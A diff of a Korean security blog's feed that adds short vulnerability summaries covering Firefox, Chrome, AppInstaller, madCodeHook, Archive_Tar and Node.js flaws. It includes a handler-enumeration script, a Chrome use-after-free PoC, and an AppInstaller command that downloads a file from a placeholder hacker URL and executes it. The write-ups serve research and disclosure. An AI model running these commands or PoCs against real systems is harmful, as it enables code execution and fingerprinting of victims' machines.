@@ -4,6 +4,198 @@
   
   
   <entry>
+    <title>[하루한줄] CVE-2020-15680 : protocol handler infomation disclosure</title>
+    <link href="/2020/12/05/fabu1ous/2020-12-05/"/>
+    <url>/2020/12/05/fabu1ous/2020-12-05/</url>
+    
+    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.fortinet.com/blog/threat-research/leaking-browser-url-protocol-handlers?utm_source=feedburner&utm_medium=feed&utm_campaign=Feed:+fortinet/blog/threat-research+(Fortinet+Threat+Research+Blog)">leaking browser url/protocol handler</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Firebox 78.01</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Firefox에서 Protocol Handler를 이용한 Information Disclosure 취약점이 발견되었습니다. Protocol Handler는 응용 프로그램이 자신의 URI scheme를 등록할 수 있는 매커니즘으로 이를 통해 프로세스를 실행할 수 있습니다. 브라우저가 Protocol Handler URI를 사용해 프로세스를 실행하면 “웹사이트에서 이 애플리케이션을 열려고 합니다.”라는 알림이 뜹니다.  </p><p>Firefox가 이미지 태그의 소스를 렌더링 할 때, Protocol Handler의 존재 여부에 따라 렌더링 결과가 다릅니다. 해커는 이점을 악용해 원격으로 victim에 설치된 프로그램 리스트를 알 수 있습니다.</p><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;존재하는ProtocolHandler://abc&quot;</span>&gt;</span></code></pre><p>victim에 존재하는 Protocol Handler를 이미지 src에 넣으면 broken image에 대한 기본 설정에 따라 Element의 size가 24x24로 렌더링 됩니다.</p><pre><code class="hljs HTML"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;존재하지않는ProtocolHandler://abc&quot;</span>&gt;</span></code></pre><p>반면, 존재하지 않는 Protocol Handler를 이미지 src에 넣으면 Element의 size는 0x0으로 설정됩니다.</p><p>따라서 해커는 간단한 JS script로 Element의 width를 검사해 Protocol Handler의 존재 여부를 확인하는 brute force 공격을 할 수 있습니다.</p><pre><code class="hljs javascript">known_handlers = [  ...]  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = knwon_handers.length <span class="hljs-number">-1</span>; i&gt;=<span class="hljs-number">0</span>; i--)&#123;  handler_id = <span class="hljs-string">&#x27;handler_&#x27;</span> + i  $(<span class="hljs-string">&#x27;body&#x27;</span>).append(<span class="hljs-string">&#x27;&lt;img id =&quot;&#x27;</span> + handler_id + <span class="hljs-string">&#x27;&quot;src=&quot;&#x27;</span>+known_handers[i]  + <span class="hljs-string">&#x27;://192.168.133.142/&quot;&gt;&lt;/img&gt;&#x27;</span>)  <span class="hljs-keyword">if</span>($(<span class="hljs-string">&#x27;#&#x27;</span> + handler_id).css(<span class="hljs-string">&#x27;width&#x27;</span>) == <span class="hljs-string">&quot;24px&quot;</span>)&#123;    $(<span class="hljs-string">&#x27;&lt;p&gt;Handler &#x27;</span> + known_handlers[i] + <span class="hljs-string">&#x27;Exists&lt;/p&gt;&#x27;</span>).appendTo(<span class="hljs-string">&#x27;#logbox&#x27;</span>);  &#125;  <span class="hljs-keyword">else</span>&#123;    $(<span class="hljs-string">&#x27;&lt;p&gt;Hander &#x27;</span> + known_handers[i] + <span class="hljs-string">&#x27;Does not exists&lt;/p&gt;&#x27;</span>).appendTo(<span class="hljs-string">&#x27;#logbox&#x27;</span>);  &#125;    $(<span class="hljs-string">&#x27;#&#x27;</span> + hander_id).remove()&#125;</code></pre>]]></content>
+    
+    
+    <categories>
+      
+      <category>1day1line</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>Fabu1ous</tag>
+      
+      <tag>cve</tag>
+      
+      <tag>information disclosure</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>[하루한줄] Chrome UAF in StopProfiler</title>
+    <link href="/2020/12/04/l0ch/2020-12-04/"/>
+    <url>/2020/12/04/l0ch/2020-12-04/</url>
+    
+    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=1119865">Chrome UAF in StopProfiler</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Chrome (Operating System: all)</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>CPU 등의 리소스 사용량을 모니터링할 수 있는 <code>profiler</code> 객체에서 비동기 처리 키워드를 사용한 UAF 취약점이 발견되었습니다. </p><p>해당 취약점의 POC는 다음과 같습니다.</p><pre><code class="hljs jsx">&lt;html&gt;    &lt;body&gt;    &lt;/body&gt;    &lt;script&gt;        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">gc</span>(<span class="hljs-params"></span>) </span>&#123;            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x100000</span>; ++i) &#123;                <span class="hljs-keyword">var</span> a = <span class="hljs-keyword">new</span> <span class="hljs-built_in">String</span>();            &#125;        &#125;        <span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">main</span>(<span class="hljs-params"></span>)</span>&#123;            <span class="hljs-keyword">var</span> pf = <span class="hljs-keyword">await</span> performance.profile(&#123; <span class="hljs-attr">sampleInterval</span>: <span class="hljs-number">10</span> &#125;);            <span class="hljs-built_in">console</span>.log(pf);            cnt = <span class="hljs-number">0</span>;            <span class="hljs-built_in">Object</span>.prototype.__defineGetter__(<span class="hljs-string">&quot;then&quot;</span>, <span class="hljs-function">()=&gt;</span>&#123;                <span class="hljs-keyword">if</span>( cnt == <span class="hljs-number">0</span>)&#123;                    cnt ++;                    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;hello&quot;</span>);                    pf.stop();                    gc();                &#125;            &#125;)            pf.stop();        &#125;        main();    &lt;/script&gt;&lt;/html&gt;</code></pre><pre><code class="hljs jsx"><span class="hljs-keyword">void</span> ProfilerGroup::StopProfiler(ScriptState* script_state,                                 Profiler* profiler,                                 ScriptPromiseResolver* resolver) &#123;...  auto* trace = ProfilerTraceBuilder::FromProfile(      script_state, profile, profiler-&gt;SourceOrigin(), profiler-&gt;TimeOrigin());  resolver-&gt;Resolve(trace);  <span class="hljs-keyword">if</span> (profile)    profile-&gt;Delete();  profilers_.erase(profiler);...</code></pre><p><code>ProfilerGroup::StopProfiler</code> 함수의 resolve는 사용자 정의 함수를 호출할 수 있습니다. </p><p>비동기 함수로 선언한 <code>main</code> 함수에서 <code>await</code> 키워드로 <code>performance.profile</code> 객체를 선언하고 <code>Object.prototype.__defineGetter__</code> 의 사용자 정의 함수와 main에서 <code>stop</code> 을 두 번 호출하게 되면  <code>CpuProfile</code> 객체가 삭제됩니다. 결과적으로 <code>CpuProfile</code> 에서 UAF 취약점을 트리거할 수 있습니다.</p><p>이는 간단하지만 높은 심각성의 UAF 취약점으로, Google은 <code>Profiler::stop</code> 에서 동기 스크립트 실행을 방지하도록 패치했습니다.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://chromium-review.googlesource.com/c/chromium/src/+/2373184">https://chromium-review.googlesource.com/c/chromium/src/+/2373184</a></p>]]></content>
+    
+    
+    <categories>
+      
+      <category>1day1line</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>L0ch</tag>
+      
+      <tag>chrome</tag>
+      
+      <tag>javascript</tag>
+      
+      <tag>uaf</tag>
+      
+      <tag>asynchronous</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>[하루한줄] Microsoft AppInstaller.exe Arbitrary File Download</title>
+    <link href="/2020/12/03/idioth/2020-12-03/"/>
+    <url>/2020/12/03/idioth/2020-12-03/</url>
+    
+    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://twitter.com/notwhickey/status/1333900137232523264">https://twitter.com/notwhickey/status/1333900137232523264</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Microsoft AppInstaller</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Microsoft App Installer에서 arbitrary file download를 하여 lolbin(<a href="https://www.cynet.com/attack-techniques-hands-on/what-are-lolbins-and-how-do-attackers-use-them-in-fileless-attacks/">living of the land binary</a>)으로 활용할 수 있는 방법이 발견되었습니다.</p><p>웹 서버에서 앱 패키지를 다운로드할 때 과정을 간소화하여 효율적으로 하기 위해 웹 서버에서 직접 앱을 설치할 수 있는 기능을 제공합니다. 웹 페이지에서 앱 패키지를 호스팅 하기 위해서 <code>ms-appinstaller:?source=</code> URI를 사용하여 <code>source=</code>에 명시된 주소에 있는 파일에 대한 앱 다운로드를 진행합니다. 이를 악용하여 해커는 자신의 악성 파일을 source에 작성하여 arbitrary file download을 진행할 수 있고 <code>forfiles</code> 명령어를 통해 앱 패키지 다운로드가 진행된 경로에서 파일을 조건문 등으로 검색하여 실행이 가능합니다.</p><pre><code class="hljs taggerscript">start ms-appinstaller://?source=&lt;hacker-url&gt; &amp;&amp; timeout &lt;sleep-time&gt; &amp;&amp; taskkill /F /IM AppInstaller.exe &gt; NULforfiles /P &quot;C:<span class="hljs-symbol">\\</span>Users<span class="hljs-symbol">\\</span><span class="hljs-variable">%username%</span><span class="hljs-symbol">\\</span>AppData<span class="hljs-symbol">\\</span>Local<span class="hljs-symbol">\\</span>Packages<span class="hljs-symbol">\\</span>Microsoft.DesktopAppInstaller_8wekyb3d8bbwe<span class="hljs-symbol">\\</span>AC<span class="hljs-symbol">\\</span>INetCache&quot; /S /M * /C &quot;cmd /c if @fsize==&lt;file-size&gt; FOR /F <span class="hljs-symbol">\\</span>&quot;tokens=*<span class="hljs-symbol">\\</span>&quot; <span class="hljs-variable">%g IN (&#x27;type @path&#x27;) do (%</span>g);&quot; &gt; NUL</code></pre><p><img src="/2020/12/03/idioth/2020-12-03/image.png"></p>]]></content>
+    
+    
+    <categories>
+      
+      <category>1day1line</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>idioth</tag>
+      
+      <tag>lolbin</tag>
+      
+      <tag>lolbas</tag>
+      
+      <tag>appinstaller</tag>
+      
+      <tag>arbitrary file download</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>[하루한줄] CVE-2020-14418 : madCodeHook library LPE</title>
+    <link href="/2020/12/02/fabu1ous/2020-12-02/"/>
+    <url>/2020/12/02/fabu1ous/2020-12-02/</url>
+    
+    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://labs.nettitude.com/blog/cve-2020-14418-madcodehook-library-local-privilege-escalation/">CVE-2020-14418</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>All software using MadCodeHook &lt;= v4.1.3</p><ul><li>Cisco AMP &lt;= v7.2.13</li><li>Morphisec Unified Threat Prevention Platform &lt;= v4.1.2</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>madCodeHook은 다양한 API hooking 기능을 지원하는 third party 라이브러리입니다. madCodeHook라이브러리에 포함된 <code>ExprevDriver.sys</code>라는 드라이버는 유저 모드 프로세스에 <code>Protector32.dll</code> 혹은 <code>Protector64.dll</code>을 삽입해 그 프로세스를 보호 및 감시할 수 있습니다. DLL injection 공격을 방지하는 기능과 프로세스 모니터링 기능을 제공하므로 몇몇 보안 제품에서 madCodeHook 라이브러리를 사용합니다.</p><p>아이러니하게도 DLL injection을 방지하기 위해 사용되는 <code>ExprevDriver.sys</code> 드라이버에 path redirection을 이용한 toctou 취약점이 존재하고, 해커는 이를 악용해 DLL injection을 할 수 있습니다.</p><ol><li><p>실제  <code>Protector64.dll</code>이 존재하는 디렉터리를 가리키는 juction을 생성합니다.</p><pre><code class="hljs powershell">“mklink /J C:\users\&lt;username&gt;\Desktop\exprev C:\Program Files\Cisco\AMP\exprev”</code></pre></li><li><p><code>ExprevDriver.sys</code>에 IOCTL을 넘겨줍니다.</p><pre><code class="hljs latex">“C:<span class="hljs-tag">\<span class="hljs-name">users</span></span><span class="hljs-tag">\<span class="hljs-name">&lt;</span></span>username&gt;<span class="hljs-tag">\<span class="hljs-name">Desktop</span></span><span class="hljs-tag">\<span class="hljs-name">exprev</span></span><span class="hljs-tag">\<span class="hljs-name">Protector</span></span>64.dll”</code></pre><p>IOCTL을 사용해  <code>ExprevDriver.sys</code>가 삽입할 DLL의 경로와 대상 프로세스를 지정할 수 있습니다.  <code>ExprevDriver.sys</code>는 DLL을 삽입하기 전에 DLL의 전자서명을 검증하는 단계를 거치는데,  IOCTL로 설정된 경로를 사용합니다. Protector64.dll의 경로를 1번에서 만들어 둔 juction으로 설정해줍니다.</p></li><li><p>디렉터리 juction을 삭제하고 가짜 <code>Protector64.dll</code>을 생성합니다.</p><p>DLL의 전자서명 검증 이후 juction을 삭제하고 2번 단계에서 지정해준 경로에 <code>Protector64.dll</code>라는 이름의 악성 DLL을 생성합니다.</p></li></ol>]]></content>
+    
+    
+    <categories>
+      
+      <category>1day1line</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>Fabu1ous</tag>
+      
+      <tag>cve</tag>
+      
+      <tag>toctou</tag>
+      
+      <tag>lpe</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>[하루한줄] CVE-2020-28948/28949 : Multiple vulnerabilities through filename manipulation</title>
+    <link href="/2020/12/01/l0ch/2020-12-01/"/>
+    <url>/2020/12/01/l0ch/2020-12-01/</url>
+    
+    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://github.com/pear/Archive_Tar/issues/33">Archive_Tar Issue - multiple vulnerabilities through filename manipulation</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>PEAR Archive_Tar</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>PEAR Archive_Tar는 PHP에서 TAR 파일을 처리하는 데 사용하는 오픈소스 라이브러리입니다. 해당 라이브러리에서 phar unseirialization과 arbitrary file overwrite 두 가지 취약점이 발견되었습니다.</p><br>첫 번째 취약점(CVE-2020-28948)은 scheme 필터링 우회를 통한 unserialization 취약점입니다.<p>Archive_Tar에는 unserialization 공격을 방지하기 위해 다음과 같은 코드가 존재합니다.</p><pre><code class="hljs php"><span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">_maliciousFilename</span>(<span class="hljs-params">$file</span>)</span><span class="hljs-function"></span>&#123;    <span class="hljs-keyword">if</span> (strpos($file, <span class="hljs-string">&#x27;phar://&#x27;</span>) === <span class="hljs-number">0</span>) &#123;        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;    &#125;    <span class="hljs-keyword">if</span> (strpos($file, <span class="hljs-string">&#x27;../&#x27;</span>) !== <span class="hljs-literal">false</span> || strpos($file, <span class="hljs-string">&#x27;..\\\\&#x27;</span>) !== <span class="hljs-literal">false</span>) &#123;        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;    &#125;    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;&#125;</code></pre><p>그러나 <code>PHAR://malicious_file.phar</code> 과 같이 대문자로 작성하면 해당 코드를 우회해 unserialization을 통한 obejct injection이 가능합니다.<br><br></p><p>두 번째 취약점(CVE-2020-28949)은 Archive_Tar에서 stream wrapper를 체크하지 않아 발생하는 arbitrary file overwrite 취약점입니다. 이 취약점 또한 CVE-2020-28948과 같은 코드에서 발생한 취약점으로, <code>file://</code> scheme에 대한 검사를 하지 않아 해커가 임의 파일을 덮어쓸 수 있습니다. php가 루트 권한으로 실행되었다면 <code>/etc/passwd</code> 파일을 포함한 시스템 파일 또한 덮어쓸 수 있습니다.</p><pre><code class="hljs php"><span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">_maliciousFilename</span>(<span class="hljs-params">$file</span>)</span><span class="hljs-function"></span>&#123;    <span class="hljs-keyword">if</span> (strpos($file, <span class="hljs-string">&#x27;://&#x27;</span>) === <span class="hljs-number">0</span>) &#123;        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;    &#125;    <span class="hljs-keyword">if</span> (strpos($file, <span class="hljs-string">&#x27;../&#x27;</span>) !== <span class="hljs-literal">false</span> || strpos($file, <span class="hljs-string">&#x27;..\\\\&#x27;</span>) !== <span class="hljs-literal">false</span>) &#123;        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;    &#125;    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;&#125;</code></pre><p>이 두 취약점은 문자열에 <code>phar://</code> 가 아닌 <code>://</code> 가 포함될 경우 이를 필터링하는 방식으로 패치되었습니다.</p>]]></content>
+    
+    
+    <categories>
+      
+      <category>1day1line</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>cve</tag>
+      
+      <tag>L0ch</tag>
+      
+      <tag>unserialization</tag>
+      
+      <tag>arbitrary file overwrite</tag>
+      
+      <tag>bypass</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>[하루한줄] CVE-2020-8277: Node.js OOB Read를 통한 Denial of Service</title>
+    <link href="/2020/11/30/idioth/2020-11-30/"/>
+    <url>/2020/11/30/idioth/2020-11-30/</url>
+    
+    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://livingbeef.blogspot.com/2020/11/cve-2020-8277-analysis-from-nodejs-code.html">CVE-2020-8277 Analysis: From Node.JS code to OOB Reads/Fail-Check</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Node.js<ul><li>&lt; 15.2.1</li><li>&lt; 14.15.1</li><li>&lt; 12.19.1</li></ul></li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Node.js에서 OOB(Out of Bounds) Read를 통해 Denial of Service를 트리거할 수 있는 취약점이 발견되었습니다. 해당 취약점은 많은 양의 DNS record를 <a href="https://github.com/nodejs/node/blob/642174a31f7c2d3a8352002095d35a2b34c1126c/src/cares_wrap.cc">c-ares 라이브러리</a>에서 TTL record를 parsing 할 때 배열 길이의 계산을 잘못하면서 일어나는 취약점입니다.</p><p>c-ares 라이브러리의 <code>ares_parse_aaaa_reply</code> 함수는 response를 포함하는 <code>char* abuffer</code>, response의 길이인 <code>alen</code>, DNS response가 반환될 구조체 포인터 <code>host</code>, TTL 배열인 <code>addrttls / naddrttls</code>를 인자로 갖습니다. <code>addrttls</code>는 반환된 TTL의 주소로 채워지는 배열이고, <code>naddrttls</code>는 반환할 TTL의 최대 값입니다. response의 reply 개수가 <code>addrttls</code> 배열보다 클 경우  <code>naddrttls</code>에서 확인 후 256개의 TTL만 처리되고 나머지 부분은 잘리게 됩니다. 하지만 취약점은 TTL의 개수에 대한 잘못된 처리가 아니라 response의 reply 개수를 잘못 계산하는 것에서 일어납니다.</p><ol><li>reply의 개수를 새서 <code>naddrs</code>에 저장</li><li>TTL 배열 작성(<code>naddrttls</code>에 의해 잘린 <code>addrttls</code>)</li><li><code>naddrttls</code> 재작성 - 실제 TTL 배열에 작성된 값보다 큰 지 확인하지 않고 <code>naddrs</code>를 집어넣음</li></ol><p>따라서 반환된 <code>naddrttls</code>가 작성된 reply의 TTL 개수보다 커지므로 OOB read가 가능하고 이를 악용하여 Denial of Service 공격을 트리거할 수 있습니다.</p><p>해당 취약점은 <code>naddrttls</code>에 <code>naddrs</code> 값을 넣을 때 <code>naddrs</code>의 값이 <code>naddrttls</code>보다 클 경우 <code>naddrttls</code> 값을 넣는 것으로 패치되었습니다.</p><pre><code class="hljs c"><span class="hljs-keyword">if</span>(naddrttls)&#123;*naddrttls = (naddrs &gt; *naddrsttls) ? *naddrttls:naddrs;&#125;</code></pre>]]></content>
+    
+    
+    <categories>
+      
+      <category>1day1line</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>cve</tag>
+      
+      <tag>idioth</tag>
+      
+      <tag>dos</tag>
+      
+      <tag>node.js</tag>
+      
+      <tag>oob read</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>[Research] Windows Patch Diffing 맛보기 Part 2</title>
     <link href="/2020/11/29/l0ch/windows-patch-diffing-part2/"/>
     <url>/2020/11/29/l0ch/windows-patch-diffing-part2/</url>
@@ -90,11 +282,11 @@
       
       <tag>cve</tag>
       
+      <tag>arbitrary file download</tag>
+      
       <tag>L0ch</tag>
       
       <tag>path traversal</tag>
-      
-      <tag>arbitrary file download</tag>
       
     </tags>
     
@@ -220,9 +412,9 @@
       
       <tag>toctou</tag>
       
-      <tag>idioth</tag>
-      
       <tag>lpe</tag>
+      
+      <tag>idioth</tag>
       
       <tag>geforce experience</tag>
       
@@ -455,9 +647,9 @@
       
       <tag>eop</tag>
       
-      <tag>idioth</tag>
-      
       <tag>lpe</tag>
+      
+      <tag>idioth</tag>
       
       <tag>dll hijacking</tag>
       
